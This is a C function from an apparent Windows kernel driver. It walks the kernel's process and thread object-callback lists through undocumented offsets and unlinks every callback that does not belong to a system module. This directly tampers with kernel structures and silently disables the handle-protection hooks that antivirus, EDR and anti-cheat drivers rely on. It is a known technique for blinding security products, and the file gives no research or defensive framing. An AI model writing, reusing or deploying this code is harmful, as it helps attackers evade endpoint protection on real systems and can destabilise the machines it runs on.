
NTSTATUS
RemoveAllObCallbacks(
	VOID
)
{
	if (G_ObCallbacksActive && G_ObCallbackHandle != NULL)
	{
		ObUnRegisterCallbacks(G_ObCallbackHandle);
		LogMessage("ObCallbacks unregistered via API.\n");
	}

	ULONG    Offset;
	NTSTATUS Status = FindObCallbackListOffset(&Offset);
	if (!NT_SUCCESS(Status))
	{
		LogMessage("RemoveAllObCallbacks: FindObCallbackListOffset failed 0x%08X\n", Status);
		G_ObCallbacksActive = FALSE;
		G_ObCallbackHandle = NULL;
		return Status;
	}

	PMY_MODULE_INFO ModuleInfo = GetSystemModuleInfo();

	POBJECT_TYPE ObjectTypes[2];
	ObjectTypes[0] = *PsProcessType;
	ObjectTypes[1] = *PsThreadType;

	for (INT t = 0; t < 2; t++)
	{
		PUCHAR      Base = (PUCHAR)ObjectTypes[t];
		PLIST_ENTRY ListHead = (PLIST_ENTRY)(Base + Offset);

	PLIST_ENTRY Entry = ListHead->Flink;
	while (Entry != ListHead)
	{
		if (!MmIsAddressValid(Entry) || !MmIsAddressValid(Entry->Flink))
			break;

		PLIST_ENTRY Next;
		PVOID PreOp = NULL;
		__try
		{
			Next = Entry->Flink;
			if (!MmIsAddressValid((PUCHAR)Entry + 0x28))
				break;
			PreOp = *(PVOID*)((PUCHAR)Entry + 0x20);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			break;
		}

		if (ModuleInfo != NULL && IsAddressInSystemModule(PreOp, ModuleInfo))
		{
			LogMessage("Skipping system Ob callback (PreOp 0x%p).\n", PreOp);
		}
		else
		{
			RemoveEntryList(Entry);
		}

		Entry = Next;
	}
	}

	if (ModuleInfo != NULL)
		ExFreePoolWithTag(ModuleInfo, POOL_TAG);

	G_ObCallbacksActive = FALSE;
	G_ObCallbackHandle = NULL;

	LogMessage("Non-system ObCallbacks removed (Process + Thread).\n");
	return STATUS_SUCCESS;
}
